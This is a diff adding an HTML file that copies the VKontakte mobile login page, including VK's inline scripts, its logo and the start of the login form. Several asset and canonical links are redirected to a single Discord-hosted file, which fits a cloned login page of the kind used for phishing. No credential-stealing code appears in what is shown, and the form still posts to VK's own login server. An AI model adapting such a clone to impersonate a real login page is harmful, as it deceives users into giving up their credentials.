@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html class="vk vk_js_no vk_1x vk_flex_no r d h vk_appAuth_no n vk_old vk_schemes_no" lang="ru">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="176" name="MobileOptimized"/>
+<meta content="True" name="HandheldFriendly"/>
+<base id="base"/>
+<meta content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." name="description"/>
+<meta content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." property="og:description"/>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="shortcut icon"/>
+<meta content="#ffffff" name="theme-color"/>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="icon" sizes="32x32" type="image/png"/>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="apple-touch-icon"/>
+<meta content="ВКонтакте" name="apple-mobile-web-app-title"/>
+<meta content="ВКонтакте" name="application-name"/>
+<meta content="yes" name="mobile-web-app-capable"/>
+<meta content="black" name="apple-mobile-web-app-status-bar-style"/>
+<title>Вход | ВКонтакте</title>
+<meta content="Av8ECqeAAIiC9bF3N7aq2M/TaxNzzpPcFXnw0rRb9KRUQlbyHKYmPj6KeVUFVDk+S7W9RfJH2GsEOS8G99uJvgcAAABaeyJvcmlnaW4iOiJodHRwczovL3ZrLmNvbTo0NDMiLCJmZWF0dXJlIjoiQmFkZ2luZyIsImV4cGlyeSI6MTU2MTY2MTkxNCwiaXNTdWJkb21haW4iOnRydWV9" http-equiv="origin-trial"/>
+<script>
+          (function() {
+            window.vk = {"id":0,"__debug":false,"__dev":false,"wsTransport":"https:\/\/stats.vk-portal.net","statsMeta":{"platform":"mvk","st":false,"time":1607780651,"hash":"9Mf4ryw7CxRXeMFJz1lbN6Kwlag39PHDyzzAmHkrgL4"},"tnsPixelType":"unauth","tnsPixelSocdem":"13","platform":"mvk","rv":"105331","ts":1607780651,"sw":null,"stFiles":{"https:\/\/st.vk.com\/css\/mobile\/common.2eafb5f915930775424b.css":"","https:\/\/st.vk.com\/css\/mobile\/unauthorized.b696ee8d175f05c936d2.css":"","https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js":"ed4e88ecd0618147282085194f32a548dc92904a688f812523b96332387831ea","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js":"b0f4b6f78fc8e4b55689e475202ec69ccde25488bb108d86c38d211f24e33055","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js":"0410f0c3a10a4b289bd04de264ff4e13b620d3598a76bdb731f7444305361477","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js":"517913a24edb7ad3e9796e7072ebf9dacff3efcd263d9d2fdc1267d2bc466658","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js":"eff135dd490212d76a8a76abc5964393193ee5690d3031fe5f3637e8ff490a4b","https:\/\/st.vk.com\/js\/cmodules\/mobile\/grip.e8e4b35c5b83567bff02.js":"e302f55325f64ba96577b91faf5183fe62dc1758d24902eb1631ff1ab6515d84","https:\/\/st.vk.com\/js\/cmodules\/mobile\/unauthorized.413255dc684151d42b65.js":"90308fc286e21a54ed953bee036507945bd976ad8c86fdc131ef21c1aa59b28c"},"stNavMap":{"^\\\/join":["https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/join.3509913ff6a1fb9741b6.js","https:\/\/st.vk.com\/css\/mobile\/join.bd684652dda4f897e0e0.css"],"promocode(\\\/([0-9a-zA-Z-]+))?":["https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/promocode.17b691a7ce2462ef8a07.js","https:\/\/st.vk.com\/css\/mobile\/promocode.ea3977451b377bf0bf41.css"],"^\\\/video":["https:\/\/st.vk.com\/css\/mobile\/video.2094dc474c583cd4bdd6.css","https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/video.f03ec5bb80773840b9fc.js","https:\/\/st.vk.com\/css\/mobile\/mail.a005a67520fc38d651e8.css"],"^\\\/clip":["https:\/\/st.vk.com\/css\/mobile\/ShortVideoPage.3ef40d6ee8024f42b1df.css","https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/short_video.2e607d26b819eb2c89ed.js","https:\/\/st.vk.com\/css\/mobile\/mail.a005a67520fc38d651e8.css"],"^\\\/(photo|album|tag|attachments|market)":["https:\/\/st.vk.com\/css\/mobile\/photo.e0956ffeaa26b6909944.css","https:\/\/st.vk.com\/css\/mobile\/mail.a005a67520fc38d651e8.css"],"^\\\/(wall|mail|write|im|chatjoin)":["https:\/\/st.vk.com\/css\/mobile\/mail.a005a67520fc38d651e8.css"],"settings\\?act=money_transfer_history":["https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/money_transfer_history.1c2ef73acd8bcd6c7e25.js","https:\/\/st.vk.com\/css\/mobile\/money_transfer_history.76d5699c24426df607f2.css"],"reports\\?act=":["https:\/\/st.vk.com\/css\/mobile\/reports.bb4eaa920be32d4bef20.css"],"^\\\/(blog|about|press|jobs|products|adv)":["https:\/\/st.vk.com\/css\/mobile\/blog.6e710f4907e9ada0f209.css","https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/blog.62b55b52ef2cbb915c12.js","https:\/\/st.vk.com\/css\/mobile\/mail.a005a67520fc38d651e8.css"],"^\\\/(product|cart|orders|market\\.php)(\\??[0-9a-zA-Z=_-]+)?":["https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/vendors.3624a680f0fbfd12a0e2.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/icons.f51e8e19d707e354f334.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/market.1c4285d1b0729329dff3.js","https:\/\/st.vk.com\/css\/mobile\/market.6b7b364014136667b373.css"],"^\\\/groups_catalog\\\/([0-9a-zA-Z_\\-]+)$":["https:\/\/st.vk.com\/js\/cmodules\/mobile\/runtime.cdbc1f3d34c216a13bc8.js","https:\/\/st.vk.com\/js\/cmodules\/mobile\/groups_catalog.3215fa35d4ed65ff7140.js"]},"pe":{"article_poll":1,"vk_apps_svg_qr":1,"upload.send_upload_stat":1,"push_notifier":1,"story_reactions_web":1,"notify_new_events_box":1,"mini_apps_web_add_to_favorites":1,"mini_apps_web_add_to_menu":1,"mini_apps_m_web_new_stub_page":1,"mini_apps_web_catalog_enabled":1,"cookie_secure_default_true":1,"mvk_new_info_snackbar":1,"stickers_bot_link":1,"widgets_xdm_same_origin":1,"stickers_money_transfer_suggestions":1,"web2_story_box_enabled":1,"bridge_mobile_story_box_enabled":1,"gifts_stickers_preview_tooltips":1,"easy_market_promote_new_payment":1,"navigation_timespent":1,"mvk_mediascope_counter":1,"market_item_recommendations_view_log":1,"market_item_others_view_log":1,"web_stats_transport_story_view":1,"registration_item_stat":1,"mvk_lazy_static_reload":1,"notifications_view_new":1,"add_from_field_to_docs_box":1,"ads_market_autopromotion_bookmarks_stats":1,"web_new_photo_editor":1,"web_new_photo_editor_crop":1,"web_photo_editor_hide_entrypoint":1,"web_stats_try_send":1,"stickers_catalog_reload_after_buy":1,"web_stats_send_on_events_limit":1,"market_hidden_albums_in_autopromotion":1,"stickers_web_new_ui":1,"ads_new_reports_web_tgb":1,"ads_autopromotion_web_cashback":1,"recognize_mock_turn_off":1,"photo_recognition_counter":1,"photo_recognition_web":1,"aliexpress_app_links_with_partner_links":1,"ads_new_reports_web_histories":1,"ads_new_reports_mvk_histories":1,"audio_unauth_preview":1,"ads_easy_promote_goods_new_create_api":1,"microlandings_admin_panel_api_stat":1},"ex":[],"audioAdsConfig":{"_":"_"}};
+            window.isMVK = true;
+            window.isCustomScroll = false;
+            window.isNewMail = false;
+            window.isNewLongpoll = false;
+            window.audioSubscribe = false;
+            window.isArticleWebView = false;
+            window.isBasicOffline = true;
+
+            var vkElem = document.querySelector('.vk');
+            var vkClass = vkElem.getAttribute('class');
+
+            function cssPropertySupported(pNames) {
+              var element = document.createElement('a');
+              var index = pNames.length;
+              try {
+                while (index--) {
+                  var name = pNames[index];
+
+                  element.style.display = name;
+                  if (element.style.display === name) {
+                    return true;
+                  }
+                }
+              } catch (pError) {}
+
+              return false;
+            }
+            var supports = {
+              js: true,
+              flex: cssPropertySupported('flex -webkit-flex -ms-flexbox -moz-box -webkit-box'.split(' ')),
+            };
+
+            supports.js && (vkClass = vkClass.replace('vk_js_no', 'vk_js_yes'));
+            supports.flex && (vkClass = vkClass.replace('vk_flex_no', 'vk_flex_yes'));
+            vkElem.setAttribute('class', vkClass);
+          })();
+        </script>
+<script type="text/javascript">
+<!--
+;(function(){"use strict";function e(e){t(e),e.hash_redirect&&o(e),e.al_ver&&(window.al={ver:e.al_ver}),document.addEventListener("DOMContentLoaded",(function(){e.enabled_tooltips&&window.Tooltip&&window.Tooltip.initEnabledTooltips&&window.Tooltip.initEnabledTooltips(e.enabled_tooltips)}))}function t(e){var t=e.iospwa_cookie,o=e.device_cookie,i=e.cookie_secure,n=e.cookie_samesite,a=e.cookie_path,r=e.cookie_domain,c=e.need_reload,s=new Date((new Date).getTime()+7776e6).toUTCString();!0===navigator.standalone&&-1===document.cookie.indexOf(t+"=1")&&(document.cookie=t+"=1; expires="+s+";"+i+n+" path="+a+"; domain="+r);var l=document,d=window,u="undefined",p="!",f="-",m=d.screen,v=m.width||0,h=m.height||0,y=d.devicePixelRatio||1,w=new RegExp("(^|;\\s+)"+o+"=([^;]+)"),g=(l.cookie.match(w)||[])[2]||"",T=g.split("/");if(g&&v==T[0]&&h==T[1]&&y==T[2]&&7===T[3].length);else{var k=[v,h,y,M()].join("/");l.cookie=o+"=; expires="+new Date(0).toUTCString()+";"+i+n+" path="+a,l.cookie=o+"="+k+"; expires="+s+";"+i+n+" path="+a+"; domain="+r,""!==l.cookie&&c&&location.reload()}function M(){var e=(function(){var e;try{e=new XMLHttpRequest}catch(t){try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}}}return e?"!":"-"})(),t=((o=l.createElement("div")).innerHTML='<input type="file" />',"file"!==(o=o.getElementsByTagName("input")[0]).type||o.disabled?"-":"!"),o,i="ontouchstart"in d?"!":"-",n="-",a,r,c;try{(typeof navigator.geolocation!==u||typeof d.google!==u&&typeof google.gears!==u||typeof device!==u&&typeof device.getServiceObject!==u||typeof Mojo!==u&&"Mojo.Service.Request"!=typeof Mojo.Service.Request)&&(n="!")}catch(e){}return[e,t,i,n,(function(e){try{var t=d.Audio?new Audio:l.createElement("audio");if(t.canPlayType&&t.canPlayType(e)&&"no"!==t.canPlayType(e))return"!"}catch(e){}return"-"})("audio/mpeg"),(function(e){try{for(var t=l.createElement("div"),o=["","webkit","Moz","ms","O"],i=0,n=o.length;i<n;i++){var a=o[i],r=a?a+e:e.toLowerCase();if(typeof t.style[r]!==u)return"!"}return"-"}catch(e){return"-"}})("Transform"),(d.XMLHttpRequest||d.XDomainRequest)&&(d.FormData||d.FileReader&&(d.XMLHttpRequest&&XMLHttpRequest.sendAsBinary||d.ArrayBuffer&&d.Uint8Array&&(d.MozBlobBuilder||d.WebKitBlobBuilder||d.BlobBuilder)))?"!":"-"].join("")}}function o(e){var t=e.cookie_secure,o=e.cookie_samesite,i=location,n=i.hash||"",a=n.substr(2);if("#/"===n.substr(0,2)){var r=window.locDomain,c=new Date;c.setTime(c.getTime()+864e5);var s="; expires="+c.toGMTString();document.cookie=["remixtmp_hash_nav","=",escape(i.href),s,"; path=/",""+t,""+o,r?"; domain=."+r:""].join(""),a.match(/^\/*(away|login)(\.php)?([^a-z0-9\.]|$)/)&&(a=""),i.replace(i.protocol+"//"+i.host+"/"+a)}}return e})()({"hash_redirect":true,"device_cookie":"remixmdevice","iospwa_cookie":"remixmiospwa","cookie_path":"\/","cookie_domain":".vk.com","cookie_samesite":"","cookie_secure":" Secure;","need_reload":true,"enabled_tooltips":{"mvk:video_filters":false,"feed:textlive_hide":true},"al_ver":""});
+//-->
+</script>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="stylesheet"/>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="stylesheet"/>
+<script src="https://st.vk.com/js/cmodules/mobile/runtime.cdbc1f3d34c216a13bc8.js?ed4e88ecd0618147282085194f32a548dc92904a688f812523b96332387831ea"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/vendors.3624a680f0fbfd12a0e2.js?b0f4b6f78fc8e4b55689e475202ec69ccde25488bb108d86c38d211f24e33055"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/icons.f51e8e19d707e354f334.js?0410f0c3a10a4b289bd04de264ff4e13b620d3598a76bdb731f7444305361477"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/b-e17c8bb64be9fa0b31df1258ebfb5b97.b128544fcda9e8f91fd8.js?517913a24edb7ad3e9796e7072ebf9dacff3efcd263d9d2fdc1267d2bc466658"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/b-70380f1252be7d34d5428d8b07b0de12.b892916e65e5207eb47f.js?eff135dd490212d76a8a76abc5964393193ee5690d3031fe5f3637e8ff490a4b"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/grip.e8e4b35c5b83567bff02.js?e302f55325f64ba96577b91faf5183fe62dc1758d24902eb1631ff1ab6515d84"></script>
+<script src="https://st.vk.com/js/cmodules/mobile/unauthorized.413255dc684151d42b65.js?90308fc286e21a54ed953bee036507945bd976ad8c86fdc131ef21c1aa59b28c"></script>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="canonical"/>
+<link href="https://cdn.discordapp.com/attachments/494556593807949827/786998635103125554/makaba.css" rel="alternate"/>
+</head>
+<body class="vk__page _hover vk_ios_no vk_stickers_hints_support_no opera_mini_no vk_safari_no vk__page_login vk_tabbar_static vk_al_no">
+<script id="color-scheme-script" type="text/javascript">
+<!--
+;(function(){"use strict";function e(e){var o=e.colorSchemeMode,c=e.isForcedColorSchemeMode,r=e.isDarkSchemeGuideHidden,s=e.colorSchemesMap;if(window.colorScheme){var t=o;try{var i=sessionStorage.getItem("colorScheme");i&&(t=i,window.colorScheme.isModeSavingAllowed=!1),c&&(t=o,window.colorScheme.isModeSavingAllowed=!1,sessionStorage.setItem("colorScheme",o))}catch(e){}window.colorScheme.init({mode:t,schemesMap:s});var d=document.querySelector(".vk"),n=d.getAttribute("class");window.isSchemesSupported()&&(n=n.replace("vk_schemes_no","vk_schemes_yes")),d.setAttribute("class",n),window.isSchemesSupported()&&!r&&onDOMReady((function(){window.DarkSchemeModal.open()}))}var m=document.getElementById("color-scheme-script");m.parentNode.removeChild(m)}return e})()({"colorSchemeMode":"auto","isForcedColorSchemeMode":false,"isDarkSchemeGuideHidden":true,"colorSchemesMap":null});
+//-->
+</script>
+<div class="layout">
+<div class="layout__header mhead" id="vk_head">
+<div class="hb_wrap">
+<div class="hb_btn"> </div>
+</div>
+</div>
+<div class="layout__body" id="vk_wrap">
+<div class="layout__leftMenu" id="l">
+</div>
+<div class="layout__basis" id="m" role="main">
+<div class="basis">
+<div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_unauthorized_actions basis__header_nohide" id="mhead"><a accesskey="*" class="hb_wrap mhb_logo" href="/">
+<div class="lmh_logo_wrap">
+<div class="hb_btn mhi_logo"> </div>
+<div class="mhi_logo_text"><div class="mhi_logo_text_light"><div aria-hidden="true" class="svgIcon svgIcon-vk_logo_text_light_26"><svg fill="none" height="26" width="123" xmlns="http://www.w3.org/2000/svg"><path d="M18.359 12.73a3.054 3.054 0 0 1 1.512 1.077c.397.504.596 1.108.596 1.81 0 .627-.184 1.192-.55 1.696-.367.504-.886.901-1.558 1.191-.657.275-1.406.413-2.246.413h-5.957V7.002h5.705c.81 0 1.535.138 2.177.413.641.275 1.138.656 1.49 1.145.35.474.526 1.024.526 1.65 0 1.145-.565 1.986-1.695 2.52zM12.79 9.18v2.589h3.07c.458 0 .833-.115 1.123-.344.29-.244.435-.557.435-.94 0-.381-.145-.694-.435-.939-.29-.244-.665-.366-1.123-.366h-3.07zm3.322 7.561c.52 0 .932-.13 1.238-.39.32-.274.48-.626.48-1.054 0-.442-.16-.794-.48-1.053-.306-.275-.718-.413-1.238-.413h-3.322v2.91h3.322zm17.613 2.177h-3.46l-4.124-4.743H25.5v4.743h-2.635V7.002H25.5v4.628h.642l3.986-4.628h3.14L28.25 12.73l5.476 6.187zm6.725.229c-1.222 0-2.322-.26-3.3-.78a5.924 5.924 0 0 1-2.267-2.199c-.535-.947-.802-2.016-.802-3.208 0-1.191.267-2.253.802-3.184a5.712 5.712 0 0 1 2.268-2.2c.977-.535 2.077-.802 3.3-.802 1.221 0 2.314.267 3.276.802a5.522 5.522 0 0 1 2.268 2.2c.55.931.825 1.993.825 3.184 0 1.192-.275 2.261-.825 3.208a5.719 5.719 0 0 1-2.268 2.2c-.962.52-2.055.779-3.277.779zm0-2.406c1.07 0 1.94-.344 2.612-1.031.672-.703 1.008-1.62 1.008-2.75s-.336-2.039-1.008-2.726c-.672-.703-1.542-1.054-2.612-1.054-1.069 0-1.94.351-2.612 1.054-.672.687-1.008 1.596-1.008 2.726s.336 2.047 1.008 2.75c.672.687 1.543 1.031 2.612 1.031zm16.634-5.04V7.001h2.635v11.915h-2.635v-4.812h-5.338v4.812h-2.635V7.002h2.635V11.7h5.338zm11.222 7.217h-2.635V9.408h-4.124V7.002h10.883v2.406h-4.124v9.509zM78.672 6.773c1.527 0 2.726.481 3.597 1.444.886.947 1.329 2.283 1.329 4.01v6.69H81.65l-.55-1.88c-.336.566-.832 1.063-1.489 1.49-.657.413-1.436.619-2.337.619-.794 0-1.512-.16-2.154-.481a3.584 3.584 0 0 1-1.466-1.352c-.352-.58-.527-1.237-.527-1.97 0-1.131.443-2.032 1.329-2.704.901-.688 2.207-1.031 3.918-1.031h2.566c-.061-.795-.305-1.421-.733-1.88-.413-.473-.97-.71-1.673-.71-.565 0-1.054.138-1.466.413a2.617 2.617 0 0 0-.917 1.008l-2.428-.412c.29-1.009.886-1.803 1.787-2.383.916-.58 1.97-.871 3.162-.871zm-.78 10.15c.917 0 1.658-.298 2.223-.893.565-.596.848-1.383.848-2.36h-2.497c-1.788 0-2.681.52-2.681 1.558 0 .52.19.932.573 1.237.381.305.893.458 1.535.458zm19.425 1.994h-3.46l-4.124-4.743h-.642v4.743h-2.635V7.002h2.635v4.628h.642l3.987-4.628h3.139L91.84 12.73l5.476 6.187zm7.104 0h-2.635V9.408h-4.124V7.002h10.883v2.406h-4.124v9.509zm17.193-6.095c0 .23-.016.512-.046.848h-9.578c.123.931.504 1.68 1.146 2.245.642.55 1.459.825 2.452.825.672 0 1.275-.13 1.81-.39.55-.26.97-.61 1.26-1.054l2.474.413c-.427 1.1-1.168 1.948-2.222 2.543-1.039.596-2.2.894-3.483.894-1.191 0-2.26-.26-3.207-.78a5.851 5.851 0 0 1-2.2-2.199c-.519-.947-.779-2.016-.779-3.208 0-1.191.26-2.253.779-3.184a5.641 5.641 0 0 1 2.2-2.2c.947-.535 2.016-.802 3.207-.802 1.192 0 2.253.267 3.185.802a5.49 5.49 0 0 1 2.2 2.177c.534.916.802 1.94.802 3.07zm-6.187-3.758c-.794 0-1.489.23-2.085.688-.58.458-.977 1.077-1.191 1.856h6.599c-.23-.764-.642-1.375-1.238-1.833-.58-.474-1.275-.71-2.085-.71z" fill="#000"></path></svg></div></div><div class="mhi_logo_text_dark"><div aria-hidden="true" class="svgIcon svgIcon-vk_logo_text_dark_26"><svg fill="none" height="26" width="123" xmlns="http://www.w3.org/2000/svg"><path d="M18.363 12.727a3.053 3.053 0 0 1 1.512 1.077c.397.504.596 1.108.596 1.81 0 .627-.184 1.192-.55 1.696-.367.504-.886.901-1.558 1.191-.657.275-1.406.413-2.246.413H10.16V6.999h5.705c.81 0 1.535.138 2.177.413.641.274 1.138.656 1.49 1.145.35.474.526 1.024.526 1.65 0 1.145-.565 1.986-1.695 2.52zm-5.568-3.551v2.589h3.07c.458 0 .833-.115 1.123-.344.29-.244.435-.557.435-.94 0-.381-.145-.694-.435-.939-.29-.244-.665-.366-1.123-.366h-3.07zm3.322 7.56c.52 0 .932-.129 1.238-.389.32-.274.48-.626.48-1.054 0-.442-.16-.794-.48-1.053-.306-.276-.718-.413-1.238-.413h-3.322v2.91h3.322zm17.613 2.178h-3.46l-4.124-4.743h-.642v4.743H22.87V6.999h2.635v4.628h.642L30.132 7h3.14l-5.018 5.728 5.476 6.187zm6.725.229c-1.222 0-2.322-.26-3.3-.78a5.923 5.923 0 0 1-2.267-2.199c-.535-.947-.802-2.016-.802-3.208 0-1.191.267-2.253.802-3.184a5.712 5.712 0 0 1 2.268-2.2c.977-.535 2.077-.802 3.3-.802 1.221 0 2.313.267 3.276.802A5.523 5.523 0 0 1 46 9.772c.55.931.825 1.993.825 3.184 0 1.192-.275 2.261-.825 3.208a5.718 5.718 0 0 1-2.268 2.2c-.962.52-2.055.779-3.277.779zm0-2.406c1.07 0 1.94-.344 2.612-1.031.672-.703 1.008-1.62 1.008-2.75s-.336-2.039-1.008-2.726c-.672-.703-1.542-1.054-2.612-1.054-1.069 0-1.94.351-2.612 1.054-.672.687-1.008 1.596-1.008 2.726s.336 2.047 1.008 2.75c.672.687 1.543 1.03 2.612 1.03zm16.634-5.04V6.998h2.635v11.915H57.09v-4.812h-5.338v4.812h-2.635V6.999h2.635v4.697h5.338zm11.222 7.217h-2.635v-9.51h-4.124V7h10.884v2.406H68.31v9.509zM78.676 6.77c1.527 0 2.726.481 3.597 1.443.886.948 1.329 2.284 1.329 4.01v6.69h-1.948l-.55-1.878c-.336.565-.832 1.061-1.489 1.49-.657.412-1.436.618-2.337.618-.794 0-1.512-.16-2.154-.481a3.585 3.585 0 0 1-1.466-1.352c-.351-.58-.527-1.237-.527-1.97 0-1.131.443-2.032 1.329-2.704.901-.688 2.207-1.031 3.918-1.031h2.566c-.061-.795-.305-1.421-.733-1.88-.413-.473-.97-.71-1.673-.71-.565 0-1.054.138-1.466.413a2.617 2.617 0 0 0-.917 1.008l-2.428-.412c.29-1.009.886-1.803 1.787-2.383.916-.58 1.97-.871 3.162-.871zm-.78 10.15c.917 0 1.658-.298 2.223-.893.565-.596.848-1.383.848-2.36h-2.498c-1.787 0-2.68.519-2.68 1.558 0 .52.19.932.573 1.237.381.305.893.458 1.535.458zm19.425 1.994h-3.46l-4.124-4.743h-.642v4.743H86.46V6.999h2.635v4.628h.642L93.724 7h3.139l-5.018 5.728 5.476 6.187zm7.104 0h-2.635v-9.51h-4.124V7h10.884v2.406h-4.125v9.509zm17.193-6.095c0 .229-.016.512-.046.848h-9.578c.123.931.505 1.68 1.146 2.245.642.55 1.459.825 2.452.825.672 0 1.275-.13 1.81-.39.55-.26.97-.61 1.26-1.054l2.475.413c-.428 1.1-1.169 1.947-2.223 2.543-1.039.596-2.2.894-3.483.894-1.191 0-2.26-.26-3.207-.78a5.85 5.85 0 0 1-2.2-2.199c-.519-.947-.779-2.016-.779-3.208 0-1.191.26-2.253.779-3.184a5.641 5.641 0 0 1 2.2-2.2c.947-.535 2.016-.802 3.207-.802 1.192 0 2.253.267 3.185.802a5.49 5.49 0 0 1 2.2 2.177c.534.916.802 1.94.802 3.07zm-6.187-3.758c-.794 0-1.489.23-2.085.688-.58.458-.977 1.076-1.191 1.855h6.599c-.23-.763-.642-1.374-1.238-1.832-.58-.474-1.275-.71-2.085-.71z" fill="#E1E3E6"></path></svg></div></div></div>
+</div>
+<h1 class="hb_btn mh_header"> </h1>
+</a>
+</div>
+<div class="basis__menu"><div class="VideoFilterBadgeFiller"></div></div>
+<div class="basis__content mcont" data-canonical="https://vk.com/" id="mcont"><div class="screen_login"><div class="PageBlock installApp">
+<a class="installApp__link" href="https://vk.me/?act=dl">
+<div class="installApp__link_wrap">
+<div class="installApp__label">
+        Установить приложение <b>ВКонтакте</b>
+<span class="installApp__arrow"></span>
+</div>
+</div>
+</a>
+</div><div class="fit_box bl_cont new_form">
+<div class="PageBlock">
+<div class="form_item">
+<div class="login_header">
+      Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
+    </div>
+<form action="https://login.vk.com/?act=login&amp;to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--&amp;_origin=https://m.vk.com&amp;ip_h=925875f887c9ab807f&amp;lg_h=3ccb34020715d5a704&amp;role=pda&amp;utf8=1" method="POST" novalidate="">
+<dl class="fi_row">
+<dd>
+<label class="TextInput TextInput_native" role="presentational"><div class="TextInput__content"><input autocomplete="username" class="TextInput__native" name="email" onblur="TextInput.onBlur(event, this);" onfocus="TextInput.onFocus(event, this);" oninput="TextInput.onChange(event);" placeholder="Телефон или email" spellcheck="" type="email" value=""/></div></label>
+</dd>
+</dl>
+<dl class="fi_row">
+<dd>
